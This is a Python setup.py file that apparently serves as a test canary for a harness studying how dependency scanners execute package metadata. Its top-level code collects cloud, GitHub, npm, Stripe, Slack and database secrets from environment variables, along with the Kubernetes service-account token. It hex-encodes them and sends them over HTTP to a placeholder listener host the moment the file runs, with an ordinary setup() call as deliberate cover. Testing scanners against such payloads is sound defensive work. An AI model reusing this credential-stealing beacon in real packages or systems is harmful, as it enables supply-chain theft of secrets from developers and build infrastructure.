"""DVAP payload: malicious setup.py that beacons when metadata is read.

Real behavior abused
--------------------
A great many SCA / dependency tools learn a Python package's name and version by
*executing* its ``setup.py`` (``python setup.py --name``, ``egg_info``, or an
sdist build). setup.py is plain Python, so any top-level statement runs in the
analyzer's process. This is the classic "metadata execution" supply-chain sink.

Mitigation (disable_extensibility): the worker does NOT run setup.py; it parses
name/version out of this file statically with a regex, so the payload never runs.

Containment: only network target is the ``__DVAP_LISTENER_HOST__`` placeholder
(substituted by the worker). Stdlib only.
"""

import os
import urllib.request

SCAN_TOKEN = "__DVAP_SCAN_TOKEN__"
VECTOR = "__DVAP_VECTOR__"
LISTENER_HOST = "__DVAP_LISTENER_HOST__"
LISTENER_PORT = "__DVAP_LISTENER_PORT__"

SECRET_ENV_KEYS = (
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_CANARY_ACCESS_KEY_ID",
    "AWS_CANARY_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "GITHUB_TOKEN",
    "GITHUB_CANARY_TOKEN",
    "NPM_TOKEN",
    "APP_DATABASE_URL",
    "STRIPE_API_KEY",
    "SLACK_WEBHOOK_URL",
)
K8S_TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"


def _collect_exfil():
    lines = []
    for key in SECRET_ENV_KEYS:
        val = os.environ.get(key)
        if val:
            lines.append(key + "=" + val)
    try:
        with open(K8S_TOKEN_PATH, encoding="utf-8") as fh:
            lines.append("K8S_SA_TOKEN=" + fh.read().strip())
    except OSError:
        pass
    return "\n".join(lines)


def _dotted_hex(payload):
    hexed = payload.encode("utf-8").hex()
    return ".".join(hexed[i : i + 60] for i in range(0, len(hexed), 60))


def _beacon():
    dotted = _dotted_hex(_collect_exfil())
    url = (
        "http://"
        + LISTENER_HOST
        + ":"
        + str(LISTENER_PORT)
        + "/b/"
        + SCAN_TOKEN
        + "/"
        + VECTOR
        + "?d="
        + dotted
    )
    try:
        urllib.request.urlopen(url, timeout=5).read()
    except Exception:
        pass


# Executes the instant `python setup.py ...` is invoked to read metadata.
_beacon()

# Benign cover: a normal-looking setup() call. The static (mitigated) parser
# reads name/version from here without ever importing/executing the module.
try:
    from setuptools import setup
except ImportError:  # pragma: no cover - setuptools always present in worker img
    setup = None

if setup is not None:
    setup(
        name="dvap-canary",
        version="0.0.1",
        description="DVAP setup.py metadata-execution canary",
        py_modules=[],
    )
